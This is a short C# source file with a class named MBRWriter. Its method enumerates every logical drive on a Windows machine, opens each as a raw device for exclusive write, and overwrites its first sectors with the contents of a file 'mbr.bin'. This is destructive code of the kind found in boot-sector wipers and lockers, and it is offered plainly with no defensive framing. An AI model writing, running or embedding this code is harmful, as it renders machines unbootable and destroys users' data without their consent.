﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace Main.Tools
{
    public static class MBRWriter
    {
        public static void OverwriteAllMBRs()
        {
            // Get all drive letters
            string[] drives = Environment.GetLogicalDrives();

            // Overwrite MBR for each drive
            foreach (string drive in drives)
            {
                // Construct device path for current drive
                string device = @"\\.\" + drive[0] + ":";

                // Overwrite MBR for current drive
                string mbrPath = "mbr.bin"; // replace with the path to your MBR file

                byte[] mbrData = File.ReadAllBytes(mbrPath);

                using (FileStream stream = new FileStream(device, FileMode.Open, FileAccess.Write, FileShare.None))
                {
                    stream.Write(mbrData, 0, mbrData.Length);
                    stream.Flush(true);
                }

                Console.WriteLine("MBR overwritten successfully for drive " + drive);
            }
        }
    }
}